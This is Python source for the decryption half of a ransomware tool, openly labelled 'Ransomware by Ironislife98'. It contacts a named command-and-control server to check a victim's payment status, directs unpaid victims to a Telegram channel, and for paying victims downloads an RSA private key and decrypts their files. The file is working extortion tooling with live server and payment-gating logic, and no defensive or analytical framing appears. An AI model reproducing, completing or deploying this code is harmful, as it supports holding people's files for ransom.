import os
from tqdm import tqdm
import rsa
import requests
from termcolor import colored, cprint


mainserver = "https://rLockerMainServer.ironislife98.repl.co"
FORMAT = "utf-8"


def getuuid() -> str:
    with open("uuid.rlocker") as f:
        return f.read()


def getpaid() -> str:
    r = requests.get(f"{mainserver}/paidstatus/{getuuid()}").json()
    return r["message"]


def recurseAllFiles():
    path = "testkeys\\testdir"
    for root, dirs, files in os.walk(path):
        for name in files:
            yield os.path.join(root, name)


def decrypt(cipher, key):
    return rsa.decrypt(cipher, key).decode(FORMAT)


def decryptFile(path, key):
    with open(path, "rb") as f:
        data = f.read()
    try:
        with open(path, "wb") as f:
            f.write(decrypt(data, key).encode(FORMAT))
    except rsa.pkcs1.DecryptionError:
        print("Already Decrypted!")
        with open(path, "wb") as f:
            f.write(data)



def getprivatekey():
    r = requests.get(f"{mainserver}/getkey/{getuuid()}").json()
    return r["message"]


print("""
     █████ █████                         █████                        
    ░░███ ░░███                         ░░███                         
  ███████  ░███         ██████   ██████  ░███ █████  ██████  ████████ 
 ███░░███  ░███        ███░░███ ███░░███ ░███░░███  ███░░███░░███░░███
░███ ░███  ░███       ░███ ░███░███ ░░░  ░██████░  ░███████  ░███ ░░░ 
░███ ░███  ░███      █░███ ░███░███  ███ ░███░░███ ░███░░░   ░███     
░░████████ ███████████░░██████ ░░██████  ████ █████░░██████  █████    
 ░░░░░░░░ ░░░░░░░░░░░  ░░░░░░   ░░░░░░  ░░░░ ░░░░░  ░░░░░░  ░░░░░ 
""")
print("\t\t~Ransomware by Ironislife98\n")


print(f"Your Unique User ID (UUID): {colored(getuuid(), 'cyan')}")
print("Paid: ", end="")
if getpaid():
    text = colored("True", "green")
    print(text)
else:
    print(colored("False", "red", attrs=["reverse"]))

if not getpaid():
    print("Please join the telegram channel at https://t.me/+uV87_B95rIgwNGI5")
else:
    print("Decrypting...")
    # Essentially un-escaping everything needed to escape characters
    privatekey = rsa.PrivateKey.load_pkcs1(getprivatekey()[2:-1].replace("/n", "\n").encode(FORMAT))
    for filepath in tqdm(recurseAllFiles()):
        decryptFile(filepath, privatekey)
    os.remove("uuid.rlocker")